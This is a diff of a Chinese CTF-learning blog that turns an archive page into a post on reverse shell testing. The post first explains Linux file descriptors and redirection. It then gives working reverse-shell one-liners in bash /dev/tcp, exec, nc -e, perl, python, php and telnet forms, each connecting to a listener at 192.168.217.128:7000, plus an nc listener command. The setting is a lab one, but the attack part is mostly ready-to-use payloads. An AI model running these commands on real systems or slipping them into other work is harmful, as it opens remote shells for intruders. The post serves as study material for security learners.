@@ -29,18 +29,23 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"haorical.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":false,"lazyload":false,"nav":{"disqus":{"text":"Load Disqus","order":-1},"gitalk":{"order":-2}},"activeClass":"changyan"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
-<meta name="description" content="ctf退役种子选手">
-<meta property="og:type" content="website">
-<meta property="og:title" content="中国熊猫的博客">
-<meta property="og:url" content="http://haorical.xyz/archives/2021/05/index.html">
+<meta name="description" content="准备靶机为一台ubuntu，测试机为kali，两者位于同一网段内 原理文件描述符当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显示器）  文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell测试">
+<meta property="og:url" content="http://haorical.xyz/posts/9f6aba72/index.html">
 <meta property="og:site_name" content="中国熊猫的博客">
-<meta property="og:description" content="ctf退役种子选手">
+<meta property="og:description" content="准备靶机为一台ubuntu，测试机为kali，两者位于同一网段内 原理文件描述符当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显示器）  文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-27T06:38:26.000Z">
+<meta property="article:modified_time" content="2021-09-27T08:11:00.325Z">
 <meta property="article:author" content="Haorical">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="测试工具">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://haorical.xyz/archives/2021/05/">
+<link rel="canonical" href="http://haorical.xyz/posts/9f6aba72/">
 
 
 <script class="page-configurations">
@@ -48,11 +53,11 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
-<title>归档 | 中国熊猫的博客</title>
+<title>反弹shell测试 | 中国熊猫的博客</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-MH7P85EXS0"></script>
     <script>
@@ -189,7 +194,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -202,6 +207,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="nav-number">2.1.</span> <span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">2.2.</span> <span class="nav-text">重定向</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash"><span class="nav-number">3.1.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">3.2.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">3.3.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">3.4.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">3.5.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">3.6.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet"><span class="nav-number">3.7.</span> <span class="nav-text">telnet</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -272,191 +278,233 @@
 </noscript>
 
 
-    <div class="main-inner archive posts-collapse">
+    <div class="main-inner post posts-expand">
 
 
   
-  
-  
-  <div class="post-block">
-    <div class="post-content">
-      <div class="collection-title">
-        
-        <span class="collection-header">还行! 目前共计 44 篇日志。 继续努力。</span>
-      </div>
 
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/9f6aba72/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反弹shell测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+
+      <time title="创建时间：2021-09-27 14:38:26 / 修改时间：16:11:00" itemprop="dateCreated datePublished" datetime="2021-09-27T14:38:26+08:00">2021-09-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">ctf学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/9f6aba72/" class="post-meta-item leancloud_visitors" data-flag-title="反弹shell测试" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/9f6aba72/#SOHUCS" itemprop="discussionUrl">
+        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/9f6aba72/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机为一台ubuntu，测试机为kali，两者位于同一网段内</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<ul>
+<li>标准输入standard input 0 （默认设备键盘）</li>
+<li>标准输出standard output 1（默认设备显示器）</li>
+<li>错误输出：error output 2（默认设备显示器）</li>
+</ul>
+<p>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</p>
+<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ul>
+<li>输入重定向 &lt; &lt;&lt;</li>
+<li>输出重定向 &gt; &gt;&gt;</li>
+</ul>
+<ol>
+<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令</p>
+</li>
+<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
+</li>
+<li><p><strong>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</strong></p>
+</li>
+<li><p>重定向就是针对文件描述符的操作</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入重定向:</span></span><br><span class="line">[n]&lt; [file] <span class="comment">#n为文件描述符 默认为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出重定向：</span></span><br><span class="line">[n]&gt; [file] <span class="comment">#默认为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#标准输出与标准错误输出重定向：</span></span><br><span class="line">&amp;&gt; [file] &gt;&amp; [file] 等价于 &gt; [file] 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>靶机</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.217.128/7000 0&gt;&amp;1
+</code></pre>
+<p>-i 打开一个可交互的shell，&gt;&amp; 将混合输出重定向到文件（这里的&amp;是混合输出包括标准和错误的意思），0&gt;&amp;1 将标准输入重定向到文件（与前者不同，这里的 &amp; 是为了区分文件描述符和数字名的文件），其中 /dev/tcp/192.168.217.128/7000 就相当于是一个文件</p>
+<p>kali</p>
+<pre><code>nc -lvp 7000
+</code></pre>
+<p>nc监听7000端口</p>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.217.128/7000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done
+</code></pre>
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre><code>nc -e /bin/sh 192.168.217.128 7000
+</code></pre>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre><code>perl -e &#39;use Socket;$i=&quot;192.168.217.128&quot;;$p=7000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
+</code></pre>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.217.128&quot;,7000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.217.128&quot;,7000);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre>
+<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><pre><code>mknod backpipe p &amp;&amp; telnet 192.168.217.128 7000 0&lt;backpipe | /bin/bash 1&gt;backpipe
+</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iouwenbo/p/11277453.html">https://www.cnblogs.com/iouwenbo/p/11277453.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-26T20:22:41+08:00"
-              content="2021-05-26">
-          05-26
-        </time>
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/alipay.jpg" alt="Haorical 支付宝">
+        <span>支付宝</span>
       </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/2f1b0799/" itemprop="url">
-            <span itemprop="name">20210526</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-24T19:18:09+08:00"
-              content="2021-05-24">
-          05-24
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/c11566b5/" itemprop="url">
-            <span itemprop="name">20210524</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-22T21:19:32+08:00"
-              content="2021-05-22">
-          05-22
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/2876c380/" itemprop="url">
-            <span itemprop="name">20210522</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-19T20:15:37+08:00"
-              content="2021-05-19">
-          05-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/948949cb/" itemprop="url">
-            <span itemprop="name">20210519</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-18T17:30:10+08:00"
-              content="2021-05-18">
-          05-18
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/e38e795d/" itemprop="url">
-            <span itemprop="name">20210518</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-17T00:50:40+08:00"
-              content="2021-05-17">
-          05-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/436545a/" itemprop="url">
-            <span itemprop="name">20210516</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-15T16:41:50+08:00"
-              content="2021-05-15">
-          05-15
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/9d3f05e0/" itemprop="url">
-            <span itemprop="name">20210515</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-05-10T18:13:45+08:00"
-              content="2021-05-10">
-          05-10
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/743c31e9/" itemprop="url">
-            <span itemprop="name">python学习笔记</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-
-    </div>
   </div>
-  
-  
-  
+</div>
 
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Haorical
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://haorical.xyz/posts/9f6aba72/" title="反弹shell测试">http://haorical.xyz/posts/9f6aba72/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" rel="tag"># 测试工具</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/9fc12a02/" rel="prev" title="博客主站点关闭通知">
+                  <i class="fa fa-chevron-left"></i> 博客主站点关闭通知
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="SOHUCS"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -649,6 +697,17 @@ if (document.querySelectorAll('.mermaid').length) {
 
 
 
+  <script>
+  NexT.utils.loadComments('#SOHUCS', () => {
+    NexT.utils.getScript('https://changyan.sohu.com/upload/changyan.js', () => {
+      window.changyan.api.config({
+        appid: 'cyvi2vgKd',
+        conf : '7f15583657b97e637a5ebc884f987611'
+      });
+    });
+  });
+  </script>
+  <script src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
 
   
     <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
